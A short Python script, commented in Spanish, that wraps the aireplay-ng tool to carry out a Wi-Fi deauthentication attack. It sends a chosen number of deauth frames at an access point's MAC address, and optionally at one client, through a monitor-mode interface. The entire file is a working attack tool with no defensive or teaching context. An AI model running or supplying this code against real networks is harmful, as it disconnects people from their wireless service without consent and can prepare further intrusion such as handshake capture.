import subprocess

def deauth_attack(interface, bssid, client_mac=None, count=100):
    """
    Ejecuta un ataque de deautenticación usando aireplay-ng.

    - interface: interfaz en modo monitor (ej: wlan0mon)
    - bssid: MAC del AP (router)
    - client_mac: MAC del cliente (opcional)
    - count: cantidad de paquetes de deauth a enviar
    """
    try:
        print(f"[!] Iniciando ataque de deauth en {bssid}...")
        command = ["aireplay-ng", "--deauth", str(count), "-a", bssid]

        if client_mac:
            command += ["-c", client_mac]

        command.append(interface)

        subprocess.run(command)
        print("[✔] Ataque de deauth finalizado.")
    except Exception as e:
        print(f"[✘] Error durante el ataque de deauth: {e}")
